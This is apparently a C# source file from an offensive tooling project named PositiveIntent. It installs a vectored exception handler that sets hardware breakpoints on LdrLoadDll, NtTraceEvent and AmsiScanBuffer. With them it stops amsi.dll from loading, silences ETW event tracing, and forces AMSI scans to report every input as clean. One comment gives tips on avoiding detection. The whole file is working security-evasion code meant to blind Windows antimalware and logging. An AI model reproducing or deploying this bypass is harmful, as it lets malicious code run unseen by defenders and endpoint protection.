using PositiveIntent.DINV;
using System;
using System.Runtime.InteropServices;

namespace PositiveIntent
{
    class BreakpointHelper
    {
        const uint EXCEPTION_CONTINUE_EXECUTION = 0xFFFFFFFF;
        const uint EXCEPTION_CONTINUE_SEARCH = 0x0;
        const uint EXCEPTION_INT_DIVIDE_BY_ZERO = 0xC0000094;
        const uint EXCEPTION_SINGLE_STEP = 0x80000004;
        const uint CONTEXT_DEBUG_REGISTERS = 0x00010010;
        const uint CONTEXT_INTEGER = 0x00010002;
        const uint CONTEXT_CONTROL = 0x00010001;
        const uint STATUS_DLL_NOT_FOUND = 0xc0000135;

        static bool breakpointsSet = false;

        [StructLayout(LayoutKind.Sequential)]
        struct EXCEPTION_POINTERS
        {
            public IntPtr ExceptionRecord;
            public IntPtr ContextRecord;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct EXCEPTION_RECORD
        {
            public uint ExceptionCode;
            public uint ExceptionFlags;
            public IntPtr ExceptionRecord;
            public IntPtr ExceptionAddress;
            public uint NumberParameters;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 15)]
            public UIntPtr[] ExceptionInformation;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct CONTEXT
        {
            public ulong P1Home, P2Home, P3Home, P4Home, P5Home, P6Home;
            public uint ContextFlags;
            public uint MxCsr;
            public ushort SegCs, SegDs, SegEs, SegFs, SegGs, SegSs;
            public uint EFlags;
            public ulong Dr0, Dr1, Dr2, Dr3, Dr6, Dr7;
            public ulong Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi;
            public ulong R8, R9, R10, R11, R12, R13, R14, R15;
            public ulong Rip;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct UNICODE_STRING
        {
            public ushort Length;        // bytes, not chars
            public ushort MaximumLength;
            public IntPtr Buffer;        // PWSTR
        }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate IntPtr AddVectoredExceptionHandler(uint first, IntPtr handler);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate uint VectoredExceptionHandler(ref EXCEPTION_POINTERS exceptionInfo);
        static VectoredExceptionHandler handlerDelegate = new VectoredExceptionHandler(VEHCallback);

        // Consider removing the HWBPs for long-running processes to avoid detection from GetThreadContext
        static uint VEHCallback(ref EXCEPTION_POINTERS exceptionInfo)
        {
            EXCEPTION_RECORD exRecord = Marshal.PtrToStructure<EXCEPTION_RECORD>(exceptionInfo.ExceptionRecord);
            // Catch division by zero and set hardware breakpoint
            if (exRecord.ExceptionCode == EXCEPTION_INT_DIVIDE_BY_ZERO && !breakpointsSet)
            {
                CONTEXT context = Marshal.PtrToStructure<CONTEXT>(exceptionInfo.ContextRecord);

                // Get target function address
                IntPtr ntdllBaseAddress = Generic.GetLoadedModuleAddress("ntdll.dll");
                IntPtr amsiBaseAddress = Generic.GetLoadedModuleAddress("amsi.dll");
                IntPtr ldrLoadDll = Generic.GetExportAddress(ntdllBaseAddress, "LdrLoadDll");
                IntPtr ntTraceEvent = Generic.GetExportAddress(ntdllBaseAddress, "NtTraceEvent");

                // Set hardware breakpoints
                context.Dr0 = (ulong)ldrLoadDll;
                context.Dr1 = (ulong)ntTraceEvent;

                // Edge case to account for reflective loading e.g. in PowerShell where amsi.dll is already loaded
                if (amsiBaseAddress != IntPtr.Zero)
                {
                    IntPtr amsiScanBuffer = Generic.GetExportAddress(amsiBaseAddress, "AmsiScanBuffer");
                    context.Dr2 = (ulong)amsiScanBuffer;
                }

                // Configure Dr7: Enable Dr0, Dr1, Dr2 debug registers
                context.Dr7 = 0x3 | (0x3 << 4) | (0x3 << 8);

                // Mark that we want debug registers updated
                context.ContextFlags |= CONTEXT_DEBUG_REGISTERS | CONTEXT_CONTROL | CONTEXT_INTEGER;

                // Write modified context back
                Marshal.StructureToPtr(context, exceptionInfo.ContextRecord, false);

                breakpointsSet = true;

                // Let the exception propagate to managed handler (will become DivideByZeroException)
                return EXCEPTION_CONTINUE_SEARCH;
            }

            // Handle hardware breakpoint hits
            if (exRecord.ExceptionCode == EXCEPTION_SINGLE_STEP && breakpointsSet)
            {
                CONTEXT context = Marshal.PtrToStructure<CONTEXT>(exceptionInfo.ContextRecord);

                if ((context.Dr6 & 0x1) != 0)
                {
                    var unicodeStringPtr = new IntPtr((long)context.R8);
                    if (unicodeStringPtr != IntPtr.Zero)
                    {
                        var us = Marshal.PtrToStructure<UNICODE_STRING>(unicodeStringPtr);
                        if (us.Buffer != IntPtr.Zero && us.Length > 0)
                        {
                            string dllName = Marshal.PtrToStringUni(us.Buffer, us.Length / sizeof(char));
                            if (dllName.EndsWith("amsi.dll", StringComparison.OrdinalIgnoreCase))
                            {
                                // Spoof return: skip the load entirely
                                ulong returnAddress = (ulong)Marshal.ReadInt64(new IntPtr((long)context.Rsp));
                                context.Rip = returnAddress;
                                context.Rsp += 8;
                                context.Rax = STATUS_DLL_NOT_FOUND;
                            }
                        }
                    }
                }

                if ((context.Dr6 & 0x2) != 0)
                {
                    Console.WriteLine("EventWrite breakpoint hit");
                    // Simulate a 'ret' instruction
                    ulong returnAddress = (ulong)Marshal.ReadInt64(new IntPtr((long)context.Rsp));
                    context.Rip = returnAddress;
                    context.Rsp += 8;
                    context.Rax = 0x0; // ERROR_SUCCESS
                }

                if ((context.Dr6 & 0x4) != 0)
                {                    
                    // Read the AMSI_RESULT* pointer from the stack (6th argument)
                    IntPtr resultPtr = Marshal.ReadIntPtr(new IntPtr((long)context.Rsp + 0x30));
                    if (resultPtr != IntPtr.Zero)
                    {
                        Marshal.WriteInt32(resultPtr, 0); // AMSI_RESULT_CLEAN = 0
                    }
                    // Simulate a 'ret' instruction
                    ulong returnAddress = (ulong)Marshal.ReadInt64(new IntPtr((long)context.Rsp));
                    context.Rip = returnAddress;
                    context.Rsp += 8;
                    context.Rax = 0x0; // S_OK
                }

                // Clear Dr6 status register
                context.Dr6 = 0;

                // Set the Resume Flag (RF) in EFLAGS to prevent re-triggering
                // RF is bit 16 (0x10000) - tells CPU to ignore breakpoints for one instruction
                context.EFlags |= 0x10000;

                // Mark that we want debug registers updated
                context.ContextFlags |= CONTEXT_DEBUG_REGISTERS | CONTEXT_CONTROL | CONTEXT_INTEGER;

                Marshal.StructureToPtr(context, exceptionInfo.ContextRecord, false);

                return EXCEPTION_CONTINUE_EXECUTION;
            }
            return EXCEPTION_CONTINUE_SEARCH;
        }

        public static void SetupHandler()
        {
            object[] parameters = new object[] { (uint)1, Marshal.GetFunctionPointerForDelegate(handlerDelegate) };
            Generic.DynamicApiInvoke<IntPtr>("kernel32.dll", "AddVectoredExceptionHandler", typeof(AddVectoredExceptionHandler), ref parameters);
        }
    }
}